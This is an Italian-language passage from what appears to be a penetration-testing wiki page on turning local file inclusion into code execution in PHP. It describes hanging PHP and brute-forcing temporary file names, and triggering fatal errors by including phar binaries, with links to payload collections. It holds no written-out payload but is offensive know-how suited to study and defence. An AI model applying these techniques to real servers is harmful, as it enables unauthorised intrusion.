Se puoi abusare del LFI per **caricare file temporanei** e far **bloccarsi** l'esecuzione di PHP, potresti quindi **forzare i nomi dei file per ore** per trovare il file temporaneo:

{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### To Fatal Error

Se includi uno dei file `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Devi includere lo stesso due volte per generare quell'errore).

**Non so quanto sia utile, ma potrebbe esserlo.**\
&#xNAN;_&#x45; anche se causate un errore fatale di PHP, i file temporanei caricati vengono eliminati._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../images/EN-Local-File-Inclusion-1.pdf" %}

{{#include ../../banners/hacktricks-training.md}}
